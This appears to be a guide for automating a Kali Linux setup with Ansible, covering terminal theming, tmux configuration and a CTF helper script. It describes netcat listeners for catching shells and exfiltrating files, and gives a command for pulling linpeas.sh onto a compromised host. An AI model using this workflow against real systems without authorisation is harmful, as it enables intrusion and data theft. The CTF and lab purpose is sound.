# Kali - DevOps - Build
Building your standard Kali environment using Ansible

# Introduction

## Summary

The purpose of this guide is to share with you my automated Kali build. Anyone who has used Kali for some time has no doubt broken it multiple times and been faced with the prospect of having to rebuild a machine that you have spent countless hours perfecting. Many people utilise Virtual Machines and snapshots to be able to have a **known good** build that they can simply clone. I have also used this approach in the past however updating to the latest build can become arduous and can occasionally break things.  So to simplify the process you can use automation then if you add packages / repositories / download files later it's relatively straight forward to add these items into an Ansible template especially when you have some examples to work from. 

### Features

So why would you want to go to this trouble? Well apart from automating the installation of some packages and repositories that you might need this build will also install and configure

**Guake** - A top-down terminal inspired by the famous terminal used in Quake. This has been modified with a custom theme which turns off transparency (to make screenshots less distracting), set's the default key combination to be `CTRL` + `Space` and configures it to use the Dracula theme. 

**Powerlevel10k** - Powerlevel10k is a theme for Zsh. It emphasizes speed, flexibility and out-of-the-box experience. Basically it just makes your terminal look pretty. There is a whole bunch of plugins and customisations you can do with it but we'll keep in pretty simple. We'll basically just setup the Dracula theme and turn on the git plugin. 

**Tmux** - A terminal multiplexer. It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal. Although installed by default in Kali we can improve the standard configuration substantially. 

* Custom Configuration
  * Changes the special key to be `a` it's easier to hit a key on the middle row of the keyboard quickly and the special key is used all the time. As a nice side effect this actually allows you to use nested tmux sessions without any conflict. 
  * Sets the base index of windows to 1 instead of 0.  I find it makes switching windows easier. 
  * Installs the following plugins - tpm, tmux-sensible, Dracula theme, tmux-resurrect, tmux-continuum.
  * Updated Status bar which shows the VPN IP Address, CPU %, Used memory, Extended date and time, current location and temperature. 

**Custom Scripts**

* **ctf.sh** - Included is a custom script I wrote specifically for playing CTFs. It starts Tmux, then configures a basic layout including separate tabs for Enumeration, Exploits, Metasploit, Shells & Services. This script also sets the variables `$ip` (The remote host) & `$lhost` (The tun0 or ppp0 ip address) .
  * **Enumeration** - nmap / gobuster / autorecon scans.
  * **Exploitation** - For running custom exploit scripts or attempting manual exploitation. 
  * **Metasploit** -  The metasploit tab runs the msfconsole command however it sets RHOST / RHOSTS / LHOST at a global level so these options usually are pre-configured in all modules. 
  * **Shells** - The shells tab runs a netcat listener on ports 53 & 443, so this is already running and waiting for shells. It also runs a listener on port 235 which will automatically write to a file, useful if you need to exfiltrate a file. 
  * **Services** - The services tab runs a web server on port 80 in the /home/kali/share folder. If you keep all of your privesc scripts and files in this location then you simply run `wget 10.10.1.1\linpeas.sh` from a compromised host to download `linpeas.sh` for instance. The services tab also runs an SMB server in the same /home/kali/share directory because hey it's good to have options. 
* **ipaddress.sh** - My quick and dirty script to find the local tun0 or ppp0 ip address, this gets passed to the `ctf.sh` script where it is set as the `$lhost` variable in all panes and is passed into metasploit as a global variable. 

## Pre-requisites

### Kali

A base installation of Kali Linux. For this guide I downloaded the latest virtual machine from https://www.kali.org/get-kali/#kali-virtual-machines. You can also use an ISO if you're still a mouse enthusiast and like clicking things but we are trying to break that habit, as a colleague once said to me "The robot works for us, we don't work for the robot". I used the virtual machine https://cdimage.kali.org/kali-2022.4/kali-linux-2022.4-vmware-amd64.7z and imported it into VMware Workstation 15 Pro version 15.5.0 build-14665864. 

### Virtual Machine Setup

1. Extract the file `kali-linux-2022.4-vmware-amd64.7z`.
2. In VMWare select `File` -> `Scan for Virtual Machines...`.
3. Select the directory where the file `kali-linux-2022.4-vmware-amd64.7z` was extracted. 
4. Select Finish
5. Modify the VM settings as required (adjust CPU & Memory to suit hardware). 
6. Right click on the newly imported virtual machine and select `Power` -> `Start Up Guest`

## Installation

1. Git 

